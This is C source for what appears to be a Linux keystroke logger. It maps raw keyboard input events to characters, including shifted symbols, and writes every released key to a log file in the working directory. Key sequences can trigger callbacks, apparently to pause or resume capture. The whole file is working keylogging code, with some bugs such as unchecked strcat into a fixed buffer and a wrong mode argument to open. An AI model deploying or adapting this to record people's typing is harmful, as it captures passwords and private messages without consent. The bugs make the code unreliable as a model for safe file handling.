#include <errno.h>
#include <fcntl.h>      /* for open */
#include <stdbool.h>    /* for bool */
#include <stdlib.h>     /* for malloc */
#include <string.h>     /* for strerror */
#include <sys/stat.h>   /* for mode */
#include <unistd.h>     /* for getcwd */

#include "common.h"
#include "keylog.h"
#include "logger.h"

#define BUFFSIZE 255
#define MAX_KEY_SEQ 5

enum ev_value {
    RELEASED,
    PRESSED,
    REPEATED,
};

struct priv {
    keyseq_t seq_list[MAX_KEY_SEQ]; /* hard code for now */
    int num_seq;

    struct {
        int fd; /* file descriptor */
        mode_t mode;
        char name[KEY_LOG_LEN];
        int flags;
        char backspace;
    } log;
};

static int keylog_open(keylog_t *kl)
{
    struct priv *priv = (struct priv *) kl->priv;

    int oflag;
    char path[BUFFSIZE];
    struct stat stat_cwd;

    /* open for writing only, create file if doesn't exist */
    oflag = (O_WRONLY | O_CREAT);

    if (priv->log.flags & KEY_LOG_FLAG_APPEND) {
        oflag |= O_APPEND;
    } else {
        /* Truncate the file to 0 */
        oflag |= O_TRUNC;
    }

    getcwd(path, BUFFSIZE);

    /* collect information about the current directory */
    stat(path, &stat_cwd);

    strcat(path, "/");
    strcat(path, priv->log.name);
    logger.info("Log file: %s", path);

    priv->log.fd = open(path, oflag, O_WRONLY);

    /* Set the owner to match that of the directory that it's run under */
    fchown(priv->log.fd, stat_cwd.st_uid, stat_cwd.st_gid);
    fchmod(priv->log.fd, priv->log.mode);

    return OK;
}

static int keylog_close(keylog_t *kl)
{
    struct priv *priv = (struct priv *) kl->priv;

    if (close(priv->log.fd) == ERROR) {
        logger.warn("Closing %s failed: %s",
                     priv->log.name, strerror(errno));
        return ERROR;
    }

    return OK;
}

static bool has_seq_triggered(unsigned short ev_code,
                              keyseq_t *seq)
{
    bool seq_triggered = false;

    if (ev_code == seq->keys[seq->index]) {
        seq->index++;

        if (seq->index == seq->size) {
            seq->index = 0;
            seq_triggered = true;
        }
    } else {
        seq->index = 0;
    }

    return seq_triggered;
}

/*
 * Structure definition:
 *
 * struct input_event {
 *    struct timeval time;
 *    unsigned short type;
 *    unsigned short code;
 *    unsigned int value;
 * }
 */

static void keylog_log(keylog_t *kl, struct input_event e, bool is_upper)
{
    struct priv *priv = (struct priv *) kl->priv;

    if (!kl->logging_enabled) {
        return;
    }

    char lc = '\0';
    char uc = '\0';

    unsigned short code = e.code;

    switch (code) {
    case KEY_1: lc = '1'; uc = '!'; break;
    case KEY_2: lc = '2'; uc = '@'; break;
    case KEY_3: lc = '3'; uc = '#'; break;
    case KEY_4: lc = '4'; uc = '$'; break;
    case KEY_5: lc = '5'; uc = '%'; break;
    case KEY_6: lc = '6'; uc = '^'; break;
    case KEY_7: lc = '7'; uc = '&'; break;
    case KEY_8: lc = '8'; uc = '*'; break;
    case KEY_9: lc = '9'; uc = '('; break;
    case KEY_0: lc = '0'; uc = ')'; break;

    case KEY_A: lc = 'a'; uc = 'A'; break;
    case KEY_B: lc = 'b'; uc = 'B'; break;
    case KEY_C: lc = 'c'; uc = 'C'; break;
    case KEY_D: lc = 'd'; uc = 'D'; break;
    case KEY_E: lc = 'e'; uc = 'E'; break;
    case KEY_F: lc = 'f'; uc = 'F'; break;
    case KEY_G: lc = 'g'; uc = 'G'; break;
    case KEY_H: lc = 'h'; uc = 'H'; break;
    case KEY_I: lc = 'i'; uc = 'I'; break;
    case KEY_J: lc = 'j'; uc = 'J'; break;
    case KEY_K: lc = 'k'; uc = 'K'; break;
    case KEY_L: lc = 'l'; uc = 'L'; break;
    case KEY_M: lc = 'm'; uc = 'M'; break;
    case KEY_N: lc = 'n'; uc = 'N'; break;
    case KEY_O: lc = 'o'; uc = 'O'; break;
    case KEY_P: lc = 'p'; uc = 'P'; break;
    case KEY_Q: lc = 'q'; uc = 'Q'; break;
    case KEY_R: lc = 'r'; uc = 'R'; break;
    case KEY_S: lc = 's'; uc = 'S'; break;
    case KEY_T: lc = 't'; uc = 'T'; break;
    case KEY_U: lc = 'u'; uc = 'U'; break;
    case KEY_V: lc = 'v'; uc = 'V'; break;
    case KEY_W: lc = 'w'; uc = 'W'; break;
    case KEY_X: lc = 'x'; uc = 'X'; break;
    case KEY_Y: lc = 'y'; uc = 'Y'; break;
    case KEY_Z: lc = 'z'; uc = 'Z'; break;

    case KEY_COMMA: lc = ','; uc = '<'; break;
    case KEY_SEMICOLON: lc = ';'; uc = ':'; break;
    case KEY_APOSTROPHE: lc = '\''; uc = '"'; break;
    case KEY_DOT: lc = '.'; uc = '>'; break;
    case KEY_SLASH: lc = '/'; uc = '?'; break;
    case KEY_BACKSLASH: lc = '\\'; uc = '|'; break;

    case KEY_BACKSPACE:
        lc = uc = priv->log.backspace;
        break;

    case KEY_MINUS: lc = '-'; uc = '_'; break;
    case KEY_EQUAL: lc = '='; uc = '+'; break;
    case KEY_GRAVE: lc = '`'; uc = '~'; break;

    case KEY_ENTER: lc = uc = '\n'; break;
    case KEY_TAB: lc = uc = '\t'; break;
    case KEY_SPACE: lc = uc = ' '; break;

    default: lc = uc = '\0'; break;
    }

    char c = (is_upper) ? uc : lc;

    write(priv->log.fd, &c, 1);
}

void keylog_process_event(keylog_t *kl, struct input_event e)
{
    struct priv *priv = (struct priv *) kl->priv;
    static bool is_upper;

    if (e.type != EV_KEY) {
        return;
    }

    if (e.code == KEY_LEFTSHIFT || e.code == KEY_RIGHTSHIFT) {
        if (e.value == REPEATED || e.value == PRESSED) {
            is_upper = true;
        } else {
            is_upper = false;
        }
    }

    if (e.value == RELEASED) {
        keylog_log(kl, e, is_upper);

        for (int k = 0; k < priv->num_seq; k++) {
            if (has_seq_triggered(e.code, &priv->seq_list[k])) {
                priv->seq_list[k].callback(kl);
            }
        }
    }
}

void keylog_install_seq(keylog_t *kl, keyseq_t seq)
{
    struct priv *priv = (struct priv *) kl->priv;

    priv->seq_list[priv->num_seq++] = seq;
}

void keylog_pause(keylog_t *kl)
{
    kl->logging_enabled = false;
}

void keylog_resume(keylog_t *kl)
{
    kl->logging_enabled = true;
}

keylog_t *create_keylog(const cmd_args_t cmd_args)
{
    keylog_t *kl;
    struct priv *priv;

    kl = (keylog_t *) malloc(sizeof(keylog_t));
    priv = (struct priv *) malloc(sizeof(struct priv));

    kl->open = keylog_open;
    kl->close = keylog_close;
    kl->process_event = keylog_process_event;
    kl->install_seq = keylog_install_seq;

    kl->pause = keylog_pause;
    kl->resume = keylog_resume;

    priv->log.flags = cmd_args.keylog.flags;
    priv->log.backspace = cmd_args.keylog.backspace;
    priv->log.mode = cmd_args.keylog.mode;
    strncpy(priv->log.name, cmd_args.keylog.filename, KEY_LOG_LEN);

    priv->num_seq = 0;

    kl->logging_enabled = true;

    kl->priv = (void *) priv;

    return kl;
}

void destroy_keylog(keylog_t *kl)
{
    free(kl);
}
